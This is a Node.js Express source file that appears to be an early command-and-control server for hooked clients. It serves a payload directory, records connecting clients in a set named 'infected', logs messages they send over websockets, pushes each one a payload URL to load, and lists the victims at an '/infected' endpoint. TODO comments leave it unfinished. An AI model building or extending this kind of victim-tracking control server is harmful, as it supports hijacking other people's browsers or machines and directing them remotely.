const express = require('express')
const express_ws = require('express-ws')
const path = require('path')

const app = express()

express_ws(app)

// TODO make this path configurable
app.use('/payload', express.static(path.join(__dirname, '..', 'payload')))

const infected = new Set()
app.ws('/ws/:id', (ws, wsreq) => {
    infected.add(wsreq.params.id)

    ws.on('message', (msg) => {
        console.log(JSON.stringify(msg))
    })

    app.all('/view/:id', (req, res) => {
        // TODO return a specified webpage
        // TODO limit connections to RFC 1918 IPs
        res.end('hi')
    })

    ws.send(JSON.stringify({url:'http://localhost:8080/payload/test.html'}))
})

app.get('/infected', (req, res) => {
    // TODO return a specified webpage
    // TODO limit connections to RFC 1918 IPs
    res.end(JSON.stringify(Array.from(infected.values())))
})

const port = 8080 // TODO put in config file
app.listen(port, () => {
    console.log('Listening on port ' + port)
})
